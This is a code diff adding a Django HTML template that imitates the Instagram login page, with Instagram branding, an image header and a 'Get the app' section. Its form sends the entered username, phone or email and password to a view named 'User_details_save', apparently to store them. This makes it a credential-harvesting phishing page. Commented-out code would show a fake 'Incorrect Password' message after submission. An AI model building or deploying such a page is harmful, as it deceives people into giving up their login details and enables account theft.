@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login • Instagram</title>
+    {% load static %}
+    <link rel="stylesheet" href="{% static 'css\style.css' %}">
+  </head>
+  <body>
+    <div class="container">
+        <form  action="{% url 'User_details_save' %}" method="POST">{% csrf_token %}
+
+        {% load static%}
+        <img
+          src={% static 'images\insta_header.png' %}
+          title="img1"
+          style="
+            width: 70%;
+            -webkit-user-drag: none;
+            -webkit-user-select: none;
+            overflow: none;
+          "
+        />
+
+        <input
+          type="text"
+          placeholder="Phone number, username, or email" name="phone"
+          id="inputField"
+          required
+        />
+        <input
+          type="text"
+          placeholder="Password" name="password"
+          id="inputField2"
+          required
+        />
+        <button  style="cursor: pointer"  type="submit" >Log in</button>
+        {% comment %} <a href="#" style="text-decoration: none; color: rgb(154, 152, 152)"
+          >Forgot your login details?
+          <span style="color: navy; font-weight: 500"
+            >Get help logging in.</span
+          ></a
+        >
+        <p
+          href="#"
+          style="color: #f00; font-weight: 500; -webkit-user-select: none"
+          id="passwordToggleLink"
+        >
+          Incorrect Password
+        </p> {% endcomment %}
+        <div class="orDiv">
+          <hr />
+          <h4 style="color: rgb(154, 152, 152)">OR</h4>
+          <hr />
+        </div>
+      </form>
+      <div class="signUpDiv" style="overflow: none">
+        <p id="ptag">
+          Don't have an account?
+          <a href="#" style="font-weight: 500; color: navy">Sign Up</a>
+        </p>
+      </div>
+      <div class="getTheApp" style="-webkit-user-select: none">
+        <p>Get the app.</p>
+        {% load static%}
+        <img
+          src={% static 'images\appLink.png' %}
+          style="width: 80%; cursor: pointer"
+          title="Get The App"
+        />
+      </div>
+      <footer style="overflow: none"></footer>
+    </div>
+    {% comment %} <script>
+      "use strict";
+      let toggleLink = document.getElementById("passwordToggleLink");
+      let loginButton = document.getElementById("loginBtn");
+      toggleLink.style.display = "none";
+      loginButton.addEventListener("click", function () {
+        event.preventDefault();
+        toggleLink.style.display = "initial";
+      });
+     
+    </script> {% endcomment %}
+  </body>
+</html>
